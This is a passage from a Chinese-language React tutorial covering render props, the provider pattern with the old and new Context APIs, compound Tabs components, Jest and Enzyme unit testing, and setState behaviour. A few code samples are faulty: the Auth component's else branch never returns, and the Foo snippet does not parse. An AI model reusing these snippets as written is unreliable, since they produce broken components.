Login，不光在用户登录时显示一些东西，也可以定制用户没有登录时显示的东西，我们把这个组件叫做 Auth，对应代码如下\nconst Auth= (props) =&gt; &#123;  const userName = getUserName();  if (userName) &#123;    const allProps = &#123;userName, ...props&#125;;    return (      &lt;React.Fragment&gt;        &#123;props.login(allProps)&#125;      &lt;/React.Fragment&gt;    );  &#125; else &#123;    &lt;React.Fragment&gt;      &#123;props.nologin(props)&#125;    &lt;/React.Fragment&gt;  &#125;&#125;;\n\n使用 Auth 的话，可以分别通过 login 和 nologin 两个 props 来指定用户登录或者没登录时显示什么，用法如下\n&lt;Auth    login=&#123;(&#123;userName&#125;) =&gt; &lt;h1&gt;Hello &#123;userName&#125;&lt;/h1&gt;&#125;    nologin=&#123;() =&gt; &lt;h1&gt;Please login&lt;/h1&gt;&#125;/&gt;\n\n依赖注入\n\nrender props 其实就是 React 世界中的“依赖注入”\n所谓依赖注入，指的是解决这样一个问题：逻辑 A 依赖于逻辑 B，如果让 A 直接依赖于 B，当然可行，但是 A 就没法做得通用了。依赖注入就是把 B 的逻辑以函数形式传递给 A，A 和 B 之间只需要对这个函数接口达成一致就行，如此一来，再来一个逻辑 C，也可以用一样的方法重用逻辑 A\n在上面的代码示例中，Login 和 Auth 组件就是上面所说的逻辑 A，而传递给组件的函数类型 props，就是逻辑 B 和 C\n\nrender props 和高阶组件的比较\n\n首先，render props 模式的应用，就是做一个 React 组件，而高阶组件，虽然名为“组件”，其实只是一个产生 React 组件的函数\nrender props 相对于高阶组件还有一个显著优势，就是对于新增的 props 更加灵活。还是以登录状态为例，假如我们扩展 withLogin 的功能，让它给被包裹的组件传递用户名这个 props，代码如\n\nconst withLogin = (Component) =&gt; &#123;  const NewComponent = (props) =&gt; &#123;    const userName= getUserName();    if (userName) &#123;      return &lt;Component &#123;...props&#125; userName=&#123;userName&#125;/&gt;;    &#125; else &#123;      return null;    &#125;  &#125;  return NewComponent;&#125;;\n\n这就要求被 withLogin 包住的组件要接受 userName 这个props。可是，假如有一个现成的 React 组件不接受 userName，却接受名为 name 的 props 作为用户名，这就麻烦了。我们就不能直接用 withLogin 包住这个 React 组件，还要再造一个组件来做 userName 到 name 的映射，十分费事\n对于应用 render props 的 Login，就不存在这个问题，接受 name 不接受 userName 是吗？这样写就好了：\n&lt;Login&gt;  &#123;    (props) =&gt; &#123;      const &#123;userName&#125; = props;      return &lt;TheComponent &#123;...props&#125; name=&#123;userName&#125; /&gt;    &#125;  &#125;&lt;/Login&gt;\n\n\n所以，当需要重用 React 组件的逻辑时，建议首先看这个功能是否可以抽象为一个简单的组件；如果行不通的话，考虑是否可以应用 render props 模式；再不行的话，才考虑应用高阶组件模式。这并不表示高阶组件无用武之地，在后续章节，我们会对 render props 和高阶组件分别讲解具体的实例\n\n2.2 提供者模式问题场景\n\n在 React 中，props 是组件之间通讯的主要手段，但是，有一种场景单纯靠 props 来通讯是不恰当的，那就是两个组件之间间隔着多层其他组件，下面是一个简单的组件树示例图图\n\n\n在上图中，组件 A 需要传递信息给组件 X，如果通过 props 的话，那么从顶部的组件 A 开始，要把 props 传递给组件 B，然后组件 B 传递给组件 D，最后组件 D 再传递给组件 X。\n其实组件 B 和组件 D 完全用不上这些 props，但是又被迫传递这些 props，这明显不合理，要知道组件树的结构会变化的，将来如果组件 B 和组件 D 之间再插入一层新的组件，这个组件也需要传递这个 props，这就麻烦无比。\n可见，对于跨级的信息传递，我们需要一个更好的方法。\n在 React 中，解决这个问题应用的就是“提供者模式”\n提供者模式\n\n虽然这个模式叫做“提供者模式”，但是其实有两个角色，一个叫“提供者”（Provider），另一个叫“消费者”（Consumer），这两个角色都是 React 组件。其中“提供者”在组件树上居于比较靠上的位置，“消费者”处于靠下的位置。在上面的组件树中，组件 A 可以作为提供者，组件 X 就是消费者\n既然名为“提供者”，它可以提供一些信息，而且这些信息在它之下的所有组件，无论隔了多少层，都可以直接访问到，而不需要通过 props 层层传递。\n避免 props 逐级传递，即是提供者的用途。\n\n如何实现提供者模式\n\n实现提供者模式，需要 React 的 Context 功能，可以说，提供者模式只不过是让 Context 功能更好用一些而已\n所谓 Context 功能，就是能够创造一个“上下文”，在这个上下文笼罩之下的所有组件都可以访问同样的数据\n在 React v16.3.0 之前，React 虽然提供了 Context 功能，但是官方文档上都建议尽量不要使用，因为对应的 API 他们并不满意，觉得迟早要废弃掉。即使如此，依然有很多库和应用使用 Context 功能，可见对这个需求的呼声有多大\n当 React 发布 v16.3.0 时，终于提供了“正式版本”的 Context 功能 API，和之前的有很大不同，\n提供者模式的一个典型用例就是实现“样式主题”（Theme），由顶层的提供者确定一个主题，下面的样式就可以直接使用对应主题里的样式。这样，当需要切换样式时，只需要修改提供者就行，其他组件不用修改。\n\n\n为了方便比对，这里会介绍提供者模式用不同 Context API 的实现方法。不过，你如果完全不在意老版本 React 如何实现的，可以略过下面一段。\n\nReact v16.3.0 之前的提供者模式\n\n在 React v16.3.0 之前，要实现提供者，就要实现一个 React 组件，不过这个组件要做两个特殊处理\n\n\n需要实现 getChildContext 方法，用于返回“上下文”的数据\n需要定义 childContextTypes 属性，声明“上下文”的结构。\n\n下面就是一个实现“提供者”的例子，组件名为 ThemeProvider：\nclass ThemeProvider extends React.Component &#123;  getChildContext() &#123;    return &#123;      theme: this.props.value    &#125;;  &#125;  render() &#123;    return (      &lt;React.Fragment&gt;        &#123;this.props.children&#125;      &lt;/React.Fragment&gt;    );  &#125;&#125;ThemeProvider.childContextTypes = &#123;  theme: PropTypes.object&#125;;\n\n在上面的例子中，getChildContext 只是简单返回名为 value 的 props 值，但是，因为 getChildContext 是一个函数，它可以有更加复杂的操作，比如可以从 state 或者其他数据源获得数据。\n对于 ThemeProvider，我们创造了一个上下文，这个上下文就是一个对象，结构是这样\n&#123;  theme: &#123;    //一个对象  &#125;&#125;\n\n接下来，我们来做两个消费（也就是使用）这个“上下文”的组件，第一个是 Subject，代表标题；第二个是 Paragraph，代表章节。\n我们把 Subject 实现为一个类，代码如下\nclass Subject extends React.Component &#123;  render() &#123;    const &#123;mainColor&#125; = this.context.theme;    return (      &lt;h1 style=&#123;&#123;color: mainColor&#125;&#125;&gt;        &#123;this.props.children&#125;      &lt;/h1&gt;    );  &#125;&#125;Subject.contextTypes = &#123;  theme: PropTypes.object&#125;\n\n在 Subject 的 render 函数中，可以通过 this.context 访问到“上下文”数据，因为 ThemeProvider 提供的“上下文”包含 theme 字段，所以可以直接访问 this.context.theme。\n千万不要忘了 Subject 必须增加 contextTypes 属性，必须和 ThemeProvider 的 childContextTypes 属性一致，不然，this.context 就不会得到任何值。\n读者可能会问了，为什么这么麻烦呢？为什么要求“提供者”用 childContextTypes 定义一次上下文结构，又要求“消费者”再用 contextTypes 再重复定义一次呢？这不是很浪费吗？\nReact 这么要求，是考虑到“上下文”可能会嵌套，就是一个“提供者”套着另一个“提供者”，这时候，底层的消费者组件到底消费哪一个“提供者”呢？通过这种显示的方式指定。\n不过，实话实说，这样的 API 设计的确麻烦了一点，难怪 React 官方在最初就不建议使用。\n上面的 Subject 是一个类，其实也可以把消费者实现为一个纯函数组件，只不过访问“上下文”的方式有些不同，我们用纯函数的方式实现另一个消费者 Paragraph，代码如下：\nconst Paragraph = (props, context) =&gt; &#123;  const &#123;textColor&#125; = context.theme;  return (    &lt;p style=&#123;&#123;color: textColor&#125;&#125;&gt;      &#123;props.children&#125;    &lt;/p&gt;  );&#125;;Paragraph.contextTypes = &#123;  theme: PropTypes.object&#125;;\n\n从上面的代码可以看到，因为 Paragraph 是一个函数形式，所以不可能访问 this.context，但是函数的第二个参数其实就是 context。\n当然，也不要忘了设定 Paragraph 的 contextTypes，不然参数 context 也不会是上下文。\n最后，我们看如何结合”提供者“和”消费者“。\n我们做一个组件来使用 Subject 和 Paragraph，这个组件不需要帮助传递任何 props，代码如下：\nconst Page = () =&gt; (  &lt;div&gt;    &lt;Subject&gt;这是标题&lt;/Subject&gt;    &lt;Paragraph&gt;      这是正文    &lt;/Paragraph&gt;  &lt;/div&gt;);\n\n上面的组件 Page 使用了 Subject 和 Paragraph，现在我们想要定制样式主题，只需要在 Page 或者任何需要应用这个主题的组件外面包上 ThemeProvider，对应的 JSX 代码如下：\n&lt;ThemeProvider value=&#123;&#123;mainColor: &#x27;green&#x27;, textColor: &#x27;red&#x27;&#125;&#125; &gt;  &lt;Page /&gt;&lt;/ThemeProvider&gt;\n\n当我们需要改变一个样式主题的时候，改变传给 ThemeProvider的 value 值就搞定了\nReact v16.3.0 之后的提供者模式\n\n到了 React v16.3.0 的时候，新的 Context API 出来了，这套 API 毫不掩饰自己就是“提供者模式”的实现，命名上就带 “Provider” 和 “Consumer”。\n还是上面的样式主题的例子，首先，要用新提供的 createContext 函数创造一个“上下文”对象\n\nconst ThemeContext = React.createContext();\n\n这个“上下文”对象 ThemeContext 有两个属性，分别就是——对，你没猜错——Provider 和 Consumer。\nconst ThemeProvider = ThemeContext.Provider;const ThemeConsumer = ThemeContext.Consumer;\n\n创造“提供者”极大简化了，都不需要我们创造一个 React 组件类。\n使用“消费者”也同样简单，而且应用了上一节我们介绍的 render props 模式，比如，Subject 的代码如下:\nclass Subject extends React.Component &#123;  render() &#123;    return (      &lt;ThemeConsumer&gt;        &#123;          (theme) =&gt; (            &lt;h1 style=&#123;&#123;color: theme.mainColor&#125;&#125;&gt;              &#123;this.props.children&#125;            &lt;/h1&gt;          )        &#125;      &lt;/ThemeConsumer&gt;    );  &#125;&#125;\n\n上面的 ThemeConsumer 其实就是一个应用了 render props 模式的组件，它要求子组件是一个函数，会把“上下文”的数据作为参数传递给这个函数，而这个函数里就可以通过参数访问“上下文”对象。\n在新的 API 里，不需要设定组件的 childContextTypes 或者 contextTypes 属性，这省了不少事。\n可以注意到，Subject 没有自己的状态，没必要实现为类，我们用纯函数的形式实现 Paragraph，代码如下：\nconst Paragraph = (props, context) =&gt; &#123;  return (    &lt;ThemeConsumer&gt;      &#123;        (theme) =&gt; (          &lt;p style=&#123;&#123;color: theme.textColor&#125;&#125;&gt;            &#123;props.children&#125;          &lt;/p&gt;          )      &#125;    &lt;/ThemeConsumer&gt;  );&#125;;\n\n实现 Page 的方式并没有变化，而应用 ThemeProvider 的代码和之前也完全一样\n&lt;ThemeProvider value=&#123;&#123;mainColor: &#x27;green&#x27;, textColor: &#x27;red&#x27;&#125;&#125; &gt;  &lt;Page /&gt;&lt;/ThemeProvider&gt;\n\n两种提供者模式实现方式的比较\n\n通过上面的代码，可以很清楚地看到，新的 Context API 更简洁，但是，也并不是十全十美。\n在老版 Context API 中，“上下文”只是一个概念，并不对应一个代码，两个组件之间达成一个协议，就诞生了“上下文”。\n在新版 Context API 中，需要一个“上下文”对象（上面的例子中就是 ThemeContext)，使用“提供者”的代码和“消费者”的代码往往分布在不同的代码文件中，那么，这个 ThemeContext 对象放在哪个代码文件中呢？\n最好是放在一个独立的文件中，这么一来，就多出一个代码文件，而且所有和这个“上下文”相关的代码，都要依赖于这个“上下文”代码文件，虽然这没什么大不了的，但是的确多了一层依赖关系。\n为了避免依赖关系复杂，每个应用都不要滥用“上下文”，应该限制“上下文”的使用个数。\n不管怎么说，新版本的 Context API 才是未来，在 React v17 中，可能就会删除对老版 Context API 的支持，所以，现在大家都应该使用第二种实现方式。\n\n2.3 组合组件问题描述\n为了让问题更加具体，我们来解决一个实例。\n很多界面都有 Tab 这样的元件，我们需要一个 Tabs 组件和 TabItem 组件，Tabs 是容器，TabItem 是一个一个单独的 Tab，因为一个时刻只有一个 TabItem 被选中，很自然希望被选中的 TabItem 样式会和其他 TabItem 不同。\n这并不是一个很难的功能，首先我们想到的就是，用 Tabs 中一个 state 记录当前被选中的 Tabitem 序号，然后根据这个 state 传递 props 给 TabItem，当然，还要传递一个 onClick 事件进去，捕获点击选择事件。\n按照这样的设计，Tabs 中如果要显示 One、Two、Three 三个 TabItem，JSX 代码大致这么写：\n&lt;TabItem active=&#123;true&#125; onClick=&#123;this.onClick&#125;&gt;One&lt;/TabItem&gt;&lt;TabItem active=&#123;false&#125; onClick=&#123;this.onClick&#125;&gt;Two&lt;/TabItem&gt;&lt;TabItem active=&#123;false&#125; onClick=&#123;this.onClick&#125;&gt;Three&lt;/TabItem&gt;\n\n\n上面的 TabItem 组件接受 active 这个 props，如果 true 代表当前是选中状态，当然可以工作，但是，也存在大问题\n\n\n每次使用 TabItem 都要传递一堆 props，好麻烦；\n每增加一个新的 TabItem，都要增加对应的 props，更麻烦；\n如果要增加 TabItem，就要去修改 Tabs 的 JSX 代码，超麻烦。\n\n我们不想要这么麻烦，理想情况下，我们希望可以随意增加减少 TabItem 实例，不用传递一堆 props，也不用去修改 Tabs 的代码，最好代码就这样：\n&lt;Tabs&gt;  &lt;TabItem&gt;One&lt;/TabItem&gt;  &lt;TabItem&gt;Two&lt;/TabItem&gt;  &lt;TabItem&gt;Three&lt;/TabItem&gt;&lt;/Tabs&gt;\n\n如果能像上面一样写代码，那就达到目的了。\n\n像上面这样，Tabs 和 TabItem 不通过表面的 props 传递也能心有灵犀，二者之间有某种神秘的“组合”，就是我们所说的“组合组件”。\n\n实现方式\n上面我们说过，利用 Context API，可以实现组合组件，但是那样 TabItem 需要应用 render props，至于如何实现，读者可以参照上一节的介绍自己尝试。\n在这里，我们用一种更巧妙的方式来实现组合组件，可以避免 TabItem 的复杂化。\n我们先写出 TabItem 的代码，如下\nconst TabItem = (props) =&gt; &#123;  const &#123;active, onClick&#125; = props;  const tabStyle = &#123;    &#x27;max-width&#x27;: &#x27;150px&#x27;,    color: active ? &#x27;red&#x27; : &#x27;green&#x27;,    border: active ? &#x27;1px red solid&#x27; : &#x27;0px&#x27;,  &#125;;  return (    &lt;h1 style=&#123;tabStyle&#125; onClick=&#123;onClick&#125;&gt;      &#123;props.children&#125;    &lt;/h1&gt;  );&#125;;\n\nTabItem 有两个重要的 props：active 代表自己是否被激活，onClick 是自己被点击时应该调用的回调函数，这就足够了。TabItem 所做的就是根据这两个 props 渲染出 props.children，没有任何复杂逻辑，是一个活脱脱的“傻瓜组件”，所以，用一个纯函数实现就可以了。\n接下来要做的，就看 Tabs 如何把 active 和 onClick 传递给 TabItem。\n我们再来看一下使用组合组件的 JSX 代码：\n&lt;Tabs&gt;  &lt;TabItem&gt;One&lt;/TabItem&gt;  &lt;TabItem&gt;Two&lt;/TabItem&gt;  &lt;TabItem&gt;Three&lt;/TabItem&gt;&lt;/Tabs&gt;\n\n没有 props 的传递啊，怎么悄无声息地把 active 和 onClick 传递给 TabItem 呢？\nTabs 虽然可以访问到作为 props 的 children，但是到手的 children 已经是创造好的元素，而且是不可改变的，Tabs 是不可能把创造好的元素再强塞给 children 的。\n怎么办？\n办法还是有的，如果 Tabs 并不去渲染 children，而是把 children 拷贝一份，就有机会去篡改这份拷贝，最后渲染这份拷贝就好了。\n我们来看 Tabs 的实现代码\nclass Tabs extends React.Component &#123;  state = &#123;    activeIndex:  0  &#125;  render() &#123;    const newChildren = React.Children.map(this.props.children, (child, index) =&gt; &#123;      if (child.type) &#123;        return React.cloneElement(child, &#123;          active: this.state.activeIndex === index,          onClick: () =&gt; this.setState(&#123;activeIndex: index&#125;)        &#125;);      &#125; else &#123;        return child;      &#125;    &#125;);    return (      &lt;Fragment&gt;        &#123;newChildren&#125;      &lt;/Fragment&gt;    );  &#125;\n\n在 render 函数中，我们用了 React 中不常用的两个 API：\n\nReact.Children.map\nReact.cloneElement\n\n使用 React.Children.map，可以遍历 children 中所有的元素，因为 children 可能是一个数组嘛。\n使用 React.cloneElement 可以复制某个元素。这个函数第一个参数就是被复制的元素，第二个参数可以增加新产生元素的 props，我们就是利用这个机会，把 active 和 onClick 添加了进去。\n这两个 API 双剑合璧，就能实现不通过表面的 props 传递，完成两个组件的“组合”\n实际应用\n\n从上面的代码可以看出来，对于组合组件这种实现方式，TabItem 非常简化；Tabs 稍微麻烦了一点，但是好处就是把复杂度都封装起来了，从使用者角度，连 props 都看不见。\n所以，应用组合组件的往往是共享组件库，把一些常用的功能封装在组件里，让应用层直接用就行。在 antd 和 bootstrap 这样的共享库中，都使用了组合组件这种模式。\n如果你的某两个组件并不需要重用，那么就要谨慎使用组合组件模式，毕竟这让代码复杂了一些。\n\n三、React 单元测试3.1 测试的目的测试对于软件开发非常重要，简单来说，测试就是尽力发现软件中的缺陷（俗称 bug），当我们发现不了更多的 bug 时，说明这个软件质量可以接受了。\n然而，没有 bug 的软件我还没见过呢。\n在互联网时代，我们更是不可能等到所有 bug 都修复了才上线，那样黄花菜都凉了，稍微有一些工作经验的人都会有这样的体会。\n所以，事实上，测试是尽力发现软件中的 bug。当我们发现 bug 数量和严重程度呈稳定的下降趋势，直到低于一个门槛（无须降低为 0，只需要降低到可接受的程度），没有更多更严重的 bug 出现，就说明这个软件的质量可以接受，可以上线了。\n这样当然要比达到“零 bug 软件”要容易多了，但是，不要因此以为这就是一件没有困难的任务。为了让 bug 的数量和严重程度足够低，我们开发者必须严格要求自己，只有保证我们写的每一小块代码都经受住测试的考验，这些小块代码集合在一起的时候才可能（只是有可能）不会出很多 bug，如果我们写的小块代码质量都无法保证，那大项目的代码根本无法保证\n四、单元测试Jest\n在 JavaScript 的世界里，单元测试的框架很多，品牌最老名气最响的是 Mocha ，不过，不要纠结于名气，请使用 Jest 。你不会后悔的，接下来我告诉你为什么。\n我们先假设，作为开发者，你是在团队中工作。所谓团队，就是有很多人一起工作，而且随着业务和团队的发展，人会越来越多，潜台词就是——不确定因素越来越多。\n人和人之间交流会出现偏差，人的水平有高低之分，人也会犯错，总之，你不能指望所有人都把事情做得尽善尽美。\n具体到单元测试这件事上来，“测试驱动”是开发喊了这么多年，为什么真正做到这一点的团队依然不多呢？因为，当团队变大之后，很多问题也就出现了\n1、单元测试用例庞大，执行时间过长。\n想象一下，一个代码库里假设有一千个单元测试用例，即使每个单元测试用例平均只需要 10 毫秒，那总时间也就需要 10 秒钟。好，假设代码库进一步扩大，有了一万个单元测试用例，那就跑一遍就需要 100 秒，已经超过了一分钟。这还只是保守估计，实际上单元测试用例的运行时间只会比这长。开发者如果每次修改都需要等待这么漫长的单元测试运行时间，肯定会三心二意上网去看其他东西。\n2、 单元测试用例之间相互影响。\n你可能也有这样的体验，代码库中的单元测试突然失败了，但是你修改的代码根本不会取影响失败的那个单元测试用例，怎么回事？这往往是因为某个成员以前的代码写得不好，影响了一个全局变量。当然，谁都知道单元测试应该在 setup 时创建环境，在 teardown 时恢复环境，可是，总会有人有马虎大意的情况，这时候你怎么办？要么你只好去修复一个本不是你改坏的代码，要么你干脆删掉那段不可靠的单元测试代码，不管怎样，这都会打击你支持“测试驱动开发”的决心。\nJest 较好地解决了上面说的问题，因为 Jest 最重要的一个特性，就是支持并行执行\nMocha 之类老牌单元测试框架，把所有的单元测试都放在一个环境中执行，这就使所有单元测试访问的是同样一个全局变量空间，所以只要测试代码没写好，就会互相影响。而且，为了保证执行正常，所有的单元测试必须一个接一个地执行，这是体系架构决定的，没有办法。\nJest 不同，Jest 为每一个单元测试文件创造一个独立的运行环境，换句话说，Jest 会启动一个进程执行一个单元测试文件，运行结束之后，就把这个执行进程废弃了，这个单元测试文件即使写得比较差，把全局变量污染得一团糟，也不会影响其他单元测试文件，因为其他单元测试文件是用另一个进程来执行\n更妙的是，因为每个单元测试文件之间再无纠葛，Jest 可以启动多个进程同时运行不同的文件，这样就充分利用了电脑的多 CPU 多核，单进程 100 秒才完成的测试执行过程，8 核只需要 12.5 秒，速度快了很多。\nJest 还有很多其他友好的特性，大家可以自己去发掘，这里废话不多说，只想安利各位，测试 React 或者 JavaScript 代码，用 Jest！\n使用 create-react-app 产生的项目自带 Jest 作为测试框架，不奇怪，因为 Jest 和 React 一样都是出自 Facebook。\n运行下面的命令，就可以进入交互式的”测试驱动开发“模式：\nnpm test\n\nEnzyme\n虽然最好的 React 测试框架出自 Facebook 家，最受欢迎的 React 测试工具库却出自 Airbnb，这个工具库叫做 Enzyme。Enzyme 这个单词的含义是“酶”，至于命名原因已经无法考据，可能寓意着快速分解。\n不过因为 Enzyme 不是 Facebook 家出品，所以使用 Enzyme 还真稍微有些麻烦——在 create-react-app 产生的应用中并不包含 Enzyme，需要我们自己来添加。\n在项目目录下，通过下面的命令来安装 enzyme\nnpm i --save-dev enzyme enzyme-adapter-react-16\n\n可以注意到，我们不光要安装 enzyme，还要安装 enzyme-adapter-react-16，这个库是用来作为适配器的。因为不同 React 版本有各自特点，所用的适配器也会不同，我们的项目中使用的是 16.4 之后的版本，所以用 enzyme-adapter-react-16；如果用 16.3 版本，需要用 enzyme-adapter-react-16.3；如果用 16.2 版本，需要用 enzyme-adapter-react-16.2；如果用更老的版本 15.5，需要用 enzyme-adapter-react-15。具体各个 React 版本对应什么样的 Adapter，请参考 enzyme官方文档。\n现在，可以在测试代码中使用 enzyme 了。我们以之前秒表应用中的 ControlButtons 组件为例，来说明如何做单元测试。\n我们创造一个 ControlButtons.test.js，来容纳对应的测试用例，因为所有后缀为 .test.js 的文件都会被 Jest 认作是测试用例文件。\n在代码中，需要使用 Adapter，代码如下\nimport &#123;configure&#125; from &#x27;enzyme&#x27;;import Adapter from &#x27;enzyme-adapter-react-16&#x27;;configure(&#123;adapter: new Adapter()&#125;);\n\n我们对 ControlButtons 组件的测试，就是要渲染它一次，看看渲染结果如何，enzyme 就能帮助我们做这件事。\n比如，我们想要保证渲染出来的内容必须包含两个按钮，其中一个按钮的 class 名是 left-btn，另一个是 right-btn，那么我们就需要下面的单元测试用例：\nimport &#123;shallow&#125; from &#x27;enzyme&#x27;;it(&#x27;renders without crashing&#x27;, () =&gt; &#123;  const wrapper = shallow(&lt;ControlButtons /&gt;);  expect(wrapper.find(&#x27;.left-btn&#x27;)).toHaveLength(1);  expect(wrapper.find(&#x27;.right-btn&#x27;)).toHaveLength(1);&#125;);\n\n在这里我们使用了 shallow，其实也可以使用 mount。\nshallow 和 mount 的区别，就是 shallow 只会渲染被测试的 React 组件这一层，不会渲染子组件；而 mount 则是完整地渲染 React 组件包括其所有子组件，包括触发 componentDidMount 生命周期函数。\n原则上，能用 shallow 就尽量用 shallow，首先是为了测试性能考虑，其次是可以减少组件之间的影响，比如，一个组件 Foo 有子组件 Bar，如下\nconst Foo = () =&gt; ()    &lt;div&gt;       &#123;/* other logic */       &lt;Bar /&gt;    &lt;/div&gt;)\n\n如果用 mount 去渲染 Foo，会连带 Bar 一起完全渲染，如果 Bar 出了什么毛病，那 Foo 的单元测试也过不了；如果用 shallow，只知道 Bar 曾经被用，即使 Bar 哪里出了问题，也不影响 Foo 的单元测试。\n这并不是说我们就不管 Bar，Bar 的质量会由它自己的单元测试来检验，这就引出下一个话题——代码覆盖率。\n代码覆盖率\n你不能给自己的程序随便写几个单元测试，就说自己的代码已经测试好了，就像上面我只给 ControlButtons 组件写了一个测试用例，我并不能说整个秒表应用已经通过了测试。\n你的代码测试覆盖率只有达到一定程度，才好说自己的代码已经被测试了。\n剩下来就是一个纠结的问题：代码测试的覆盖率应该达到多少才算够？\n以我个人的经验，代码覆盖率必须达到 100%，也就是说，一个应用不光所有的单元测试都要通过，而且所有单元测试都必须覆盖到代码 100% 的角落。\n如果对覆盖率的要求低于 100%，时间一长，质量必定会越来越下滑。\n遇到一个不好测试的代码，开发者倾向于不去考虑如何重构代码提高可测试性，而是直接忽略这部分代码不去测试，反正不要求 100% 嘛；遇到工期比较紧的时候，甚至会进一步降低代码覆盖率要求，用牺牲质量来加快开发速度，反正不要求 100% 嘛。\n所以，如果你真的对代码质量认真负责的话，请坚守 100% 代码覆盖率的底线！\n在 create-react-app 创造的应用中，已经自带了代码覆盖率的支持，运行下面的命令，不光会运行所有单元测试，也会得到覆盖率汇报\nnpm test -- --coverage\n\n\n代码覆盖率包含四个方面：\n\n\n语句覆盖率\n逻辑分支覆盖率\n函数覆盖率\n代码行覆盖率\n\n只有四个方面都是 100%，才算真的 100%。\n五、React 状态管理5.1 组件状态React 其实就是这样一个公式\nUI = f(data)\n\n\nf 的参数 data，除了 props，就是 state。props 是组件外传递进来的数据，state 代表的就是 React 组件的内部状\n\n为什么要了解 React 组件自身状态管理\n\n因为 React 组件自身的状态管理是基础，其他第三方工具都是在这个基础上构筑的，连基础都不了解，无法真正理解第三方工具\n对于很多应用场景，React 组件自身的状态管理就足够解决问题，犯不上动用 Redux 和 MobX 这样的大杀器，简单问题简单处理，可以让代码更容易维护\n\n组件自身状态 state\n什么数据放在 state 中\n对于 React 组件而言，数据分为两种\n\nprops\nstate\n\n二者的区别显而易见，简单说就是，props 是外部传给组件的数据，而 state 是组件自己维护的数据，对外部是不可见的。\n所以，判断某个数据以 props 方式存在，还是以 state 方式存在，并不难，只需要判断这个状态是否是组件内部状态。\n一个经常被问到的问题，就是为什么不把组件的数据直接存放在组件类的成员变量中？比如像下面这样：\nclass Foo extends React.Component &#123;  foo = &#x27;foo&#x27;    render() &#123;    return (      &lt;React.Fragment&gt;&#123;this.foo&#125;&lt;/React.Fragment&gt;    );  &#125;&#125;\n\n\n像上面，数据存在 this.foo 中，而不是存在 this.state.foo 中，当这个组件渲染的时候，当然 this.foo 的值也就被渲染出来了，问题是，更新 this.foo 并不会引发组件的重新渲染，这很可能不是我们想要的。\n\n所以，判断一个数据应该放在哪里，用下面的原则\n\n如果数据由外部传入，放在 props 中\n如果是组件内部状态，是否这个状态更改应该立刻引发一次组件重新渲染？如果是，放在 state 中；不是，放在成员变量中\n\n修改 state 的正确方式\n组件自身的状态可以通过 this.state 读到，this.state 本身就是一个对象，但是修改状态不应该通过直接修改 this.state 对象来完成。因为，我们修改 state，当然不只是想修改这个对象的值，而是想引发 React 组件的重新渲染。\nthis.state.foo = &#x27;bar&#x27;; //错误的方式this.setState(&#123;foo:&#x27;bar&#x27;&#125;); //正确的方式\n\n如上面代码所示，如果只是修改 this.state，那改了也就只是改了这个对象，其他的什么都不会发生；如果使用 setState 函数，那不光修改 state，还能引发组件的重新渲染，在重新渲染中就会使用修改后的 state，这也就是达到根据 state 改变公式左侧 UI 的目的。\nUI = f(state)\n\nstate 改变引发重新渲染的时机\n现在我们知道应该用 setState 函数来修改组件 state，而且可以引发组件重新渲染，有意思的是，并不是一次 setState 调用肯定会引发一次重新渲染。\n这是 React 的一种性能优化策略，如果 React 对每一次 setState 都立刻做一次组件重新渲染，那代价有点大，比如下面的代码：\nthis.setState(&#123;count: 1&#125;);this.setState(&#123;caption: &#x27;foo&#x27;&#125;);this.setState(&#123;count: 2&#125;);\n\n连续的同步调用 setState，第三次还覆盖了第一次调用的效果，但是效果只相当于调用了下面这样一次\nthis.setState(&#123;count: 2, caption: &#x27;foo&#x27;&#125;);\n\n虽然明智的开发者不会故意连续写三个 setState 调用，但是代码一旦写得复杂，可能有多个 setState 分布在一次执行的不同代码片段中，还是会同步连续调用 setState，这时候，如果真的每个 setState 都引发一次重新渲染，实在太浪费了。\nReact 非常巧妙地用任务队列解决了这个问题，可以理解为每次 setState 函数调用都会往 React 的任务队列里放一个任务，多次 setState 调用自然会往队列里放多个任务。React 会选择时机去批量处理队列里执行任务，当批量处理开始时，React 会合并多个 setState 的操作，比如上面的三个 setState 就被合并为只更新 state 一次，也只引发一次重新渲染。\n因为这个任务队列的存在，React 并不会同步更新 state，所以，在 React 中，setState 也不保证同步更新 state 中的数据。\nstate 不会被同步修改\n简单说来，调用 setState 之后的下一行代码，读取 this.state 并不是修改之后的结果\nconsole.log(this.state.count);// 修改之前this.state.count为0this.setState(&#123;count: 1&#125;)console.log(this.state.count);// 在这里this.state.count依然为0\n\n这乍看是很让人费解的结果，但是如果你理解了上面 React 任务队列的设计，一切也不难理解。\nsetState 只是给任务队列里增加了一个修改 this.state 的任务，这个任务并没有立即执行，所以 this.state 并不会立刻改变。\n好吧，其实问题也没有那么简单，上面我所举的例子中，都假设 setState 是由 React 的生命周期函数或者事件处理函数中同步调用，这种情况下 setState 不会立即同步更新 state 和重新渲染，但是，如果调用 setState 由其他条件引发，就不是这样了。\n看下面的代码，结果可能会出乎你的所料：\nsetTimeout(() =&gt; &#123;  this.setState(&#123;count: 2&#125;); //这会立刻引发重新渲染  console.log(this.state.count); //这里读取的count就是2&#125;, 0);\n\n为什么 setTimeout 能够强迫 setState 同步更新 state 呢？\n可以这么理解，当 React 调用某个组件的生命周期函数或者事件处理函数时，React 会想：“嗯，这一次函数可能调用多次 setState，我会先打开一个标记，只要这个标记是打开的，所有的 setState 调用都是往任务队列里放任务，当这一次函数调用结束的时候，我再去批量处理任务队列，然后把这个标记关闭。”\n因为 setTimeout 是一个 JavaScript 函数，和 React 无关，对于 setTimeout 的第一个函数参数，这个函数参数的执行时机，已经不是 React 能够控制的了，换句话说，React 不知道什么时候这个函数参数会被执行，所以那个“标记”也没有打开。\n当那个“标记”没有打开时，setState 就不会给任务列表里增加任务，而是强行立刻更新 state 和引发重新渲染。这种情况下，React 认为：“这个 setState 发生在自己控制能力之外，也许开发者就是想要强行同步更新呢，宁滥勿缺，那就同步更新了吧。”\n知道这个“技巧”之后，可能会有开发者说：好啊，那么以后我就用 setTimeout 来调用 setState 吧，能够立刻更新 state，多好！\n我劝你不要这么做。\n就像上面所说，React 选择不同步更新 state，是一种性能优化，如果你用上 setTimeout，就没机会让 React 优化了。\n而且，每当你觉得需要同步更新 state 的时候，往往说明你的代码设计存在问题，绝大部分情况下，你所需要的，并不是“state 立刻更新”，而是，“确定 state 更新之后我要做什么”，这就引出了 setState 另一个功能\nsetState 的第二个参数\n\nsetState 的第二个参数可以是一个回调函数，当 state 真的被修改时，这个回调函数会被调用\n\nconsole.log(this.state.count); // 0this.setState(&#123;count: 1&#125;, () =&gt; &#123;    console.log(this.state.count); // 这里就是1了&#125;)console.log(this.state.count); // 依然为0\n\n当 setState 